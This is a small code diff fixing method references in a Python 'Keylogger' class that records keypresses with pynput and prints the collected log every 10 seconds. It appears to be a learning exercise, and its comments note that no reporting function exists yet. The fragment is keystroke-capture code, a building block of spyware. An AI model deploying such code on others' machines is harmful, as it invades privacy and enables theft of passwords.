@@ -26,16 +26,16 @@ class Keylogger: #class names start with capital letter conventionally
         global log
         print(log)
         log = ""
-        timer = threading.Timer(10, report) #recursive function - report calls itself
+        timer = threading.Timer(10, self.report) #recursive function - report calls itself
         timer.start()
     
     def start(self):
-        keyboard_listener = pynput.keyboard.Listener(on_press = process_keypress)
+        keyboard_listener = pynput.keyboard.Listener(on_press = self.process_keypress)
         #create listener object from pynput and store as var
         #pass to process_keypress function defined above
 
         with keyboard_listener:
-            report()
+            self.report()
             keyboard_listener.join()
 
         #since there is no place to implement a reporting function,
